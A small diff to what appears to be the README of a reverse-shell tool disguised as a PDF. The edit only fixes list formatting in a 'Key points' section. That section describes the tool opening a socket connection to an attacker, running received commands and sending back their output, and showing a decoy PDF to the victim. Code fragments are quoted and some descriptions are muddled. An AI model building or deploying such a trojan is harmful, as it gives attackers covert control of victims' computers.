@@ -10,10 +10,10 @@ Key points:
 
 - 🖧  Uses the `socket` module to establish a TCP connection.
 - 🔄 Redirects standard input, output, and error streams to the socket.
--🐉 `cmd = s.recv(1024).decode("utf-8").strip()` for sending the command to the attacker.
--⚡`result = output.stdout + output.stderr if result: s.send(result.encode()) else: s.send(b"[+] Command executed but no output.\n")` send the command encoded.
--🐦‍🔥`threading.Thread(target=open_pdf).start()` open the fake pdf.
--🌐`connect_back()` connect back the victim.
+- 🐉 `cmd = s.recv(1024).decode("utf-8").strip()` for sending the command to the attacker.
+- ⚡`result = output.stdout + output.stderr if result: s.send(result.encode()) else: s.send(b"[+] Command executed but no output.\n")` send the command encoded.
+- 🐦‍🔥`threading.Thread(target=open_pdf).start()` open the fake pdf.
+- 🌐`connect_back()` connect back the victim.
 
 
 ## 🛠 Requirements
